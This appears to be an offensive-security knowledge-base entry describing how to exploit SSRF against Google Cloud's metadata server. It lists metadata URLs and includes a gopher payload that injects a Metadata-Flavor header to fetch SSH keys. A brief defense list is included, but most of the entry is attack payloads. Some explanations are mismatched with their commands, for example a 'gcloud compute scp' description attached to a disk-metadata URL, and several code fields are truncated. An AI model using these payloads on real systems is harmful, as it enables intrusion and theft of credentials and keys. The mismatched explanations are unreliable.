---
id: 940fad04-123a-43d5-9aaa-9927e5ef4ae5
name: Google Cloud SSRF - Metadata Retrieval
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:38.374317+00:00'
updated_at: '2023-04-10T20:24:09.024653+00:00'
tags:
- '[[Server-Side Request Forgery]]'
- '[[SSRF URL for Cloud Instances]]'
- '[[SSRF URL for Google Cloud]]'
commands:
- '[[Fetching SSH keys from metadata server]]'
- '[[Get Google Compute Engine Instance Disk Metadata]]'
- '[[List Compute Metadata URLs]]'
---

# Google Cloud SSRF - Metadata Retrieval

## Summary

Google Cloud SSRF - Metadata Retrieval is a technique used by attackers to exploit a Server-Side Request Forgery vulnerability in a cloud instance. The attacker sends a specially crafted request to the instance's metadata server to retrieve sensitive information such as access tokens, credentials, 

## Description

# Description

Google Cloud SSRF - Metadata Retrieval is a technique used by attackers to exploit a Server-Side Request Forgery vulnerability in a cloud instance. The attacker sends a specially crafted request to the instance's metadata server to retrieve sensitive information such as access tokens, credentials, and other metadata. This can allow the attacker to gain unauthorized access to the instance and potentially other cloud resources. Technical details of this attack involve using the Gopher protocol to set required headers and retrieve metadata. The business value of this attack is that an attacker can gain access to sensitive information, which can lead to further attacks and data breaches.

## Requirements

1. Access to the cloud instance's metadata server

1. Knowledge of the instance's metadata server URL

1. Ability to send a specially crafted request using the Gopher protocol

## Defense

1. Restrict access to the metadata server to trusted sources only

1. Implement proper input validation and sanitization to prevent SSRF vulnerabilities

1. Monitor network traffic for suspicious requests to the metadata server

## Objectives

1. Retrieve sensitive information from the cloud instance metadata server

1. Gain unauthorized access to the cloud instance

1. Potentially gain access to other cloud resources

# Instructions

1. To retrieve metadata for an instance, use any of the following URLs: http://169.254.169.254/computeMetadata/v1/, http://metadata.google.internal/computeMetadata/v1/, http://metadata/computeMetadata/v1/. To retrieve instance-specific metadata, use http://metadata.google.internal/computeMetadata/v1/instance/hostname, http://metadata.google.internal/computeMetadata/v1/instance/id. To retrieve project-specific metadata, use http://metadata.google.internal/computeMetadata/v1/project/project-id.

**Code**: [[http://169.254.169.254/computeMetadata/v1/
http://]]

> This command provides a list of URLs that can be used to retrieve metadata for an instance. Metadata is data about the instance, such as its hostname, ID, and project ID. To retrieve the metadata, use one of the URLs provided and append the desired metadata endpoint to the URL. For instance-specific metadata, use the instance-specific endpoints, and for project-specific metadata, use the project-specific endpoint. This command is useful for retrieving information about an instance that can be used in scripts or other automation tasks.

**Command** ([[List Compute Metadata URLs]]):

```bash
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id
```

2. To perform a recursive pull on Google Compute Engine, use the following command:

 gcloud compute scp --recurse [INSTANCE_NAME]:[REMOTE_DIR] [LOCAL_DIR]

**Code**: [[http://metadata.google.internal/computeMetadata/v1]]

> This command allows you to copy files and directories between your local machine and a Google Compute Engine instance. The --recurse flag specifies that the copy should be performed recursively, copying all files and directories within the specified directory. [INSTANCE_NAME] is the name of the instance you want to copy files to or from, [REMOTE_DIR] is the directory on the instance you want to copy from or to, and [LOCAL_DIR] is the local directory you want to copy to or from. 

**Command** ([[Get Google Compute Engine Instance Disk Metadata]]):

```bash
http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
```

3. To access the Google Compute Engine Metadata API, use the provided URL endpoints. The endpoint 'http://metadata.google.internal/computeMetadata/v1beta1/' allows you to retrieve metadata for the instance, while 'http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true' allows you to retrieve metadata for the instance and all attached disks recursively.

To retrieve metadata, send an HTTP GET request to the desired endpoint. No headers are required for the beta version of the API.

Note that the metadata API is only available to instances running on Google Compute Engine.

**Code**: [[http://metadata.google.internal/computeMetadata/v1]]

> The Google Compute Engine Metadata API provides a way for applications running on Google Compute Engine to access metadata about the instance and its attached disks. This metadata includes information such as the instance's hostname, IP addresses, and attached disks, as well as custom metadata that can be set by the user.

To access the metadata API, send an HTTP GET request to the desired endpoint. The beta version of the API does not require any headers to be set. The metadata API is only available to instances running on Google Compute Engine.

4. To set required headers using a gopher SSRF, follow these steps:
1. Craft a gopher SSRF request with the required headers and the desired endpoint.
2. Send the request to the target server.
3. The server will interpret the gopher request as an HTTP request and include the required headers in the subsequent HTTP request.
4. The response from the server will contain the desired data.

**Code**: [[gopher://metadata.google.internal:80/xGET%20/compu]]

> This technique can be used to set headers that are required for accessing certain endpoints or APIs. By crafting a gopher SSRF request with the required headers, the server will include those headers in the subsequent HTTP request. This can be useful for bypassing access controls or authentication mechanisms that rely on specific headers being present in the request.

**Command** ([[Fetching SSH keys from metadata server]]):

```bash
gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a
```

## Commands Used

- [[Fetching SSH keys from metadata server]]
- [[Get Google Compute Engine Instance Disk Metadata]]
- [[List Compute Metadata URLs]]

## Tags

- [[Server-Side Request Forgery]]
- [[SSRF URL for Cloud Instances]]
- [[SSRF URL for Google Cloud]]
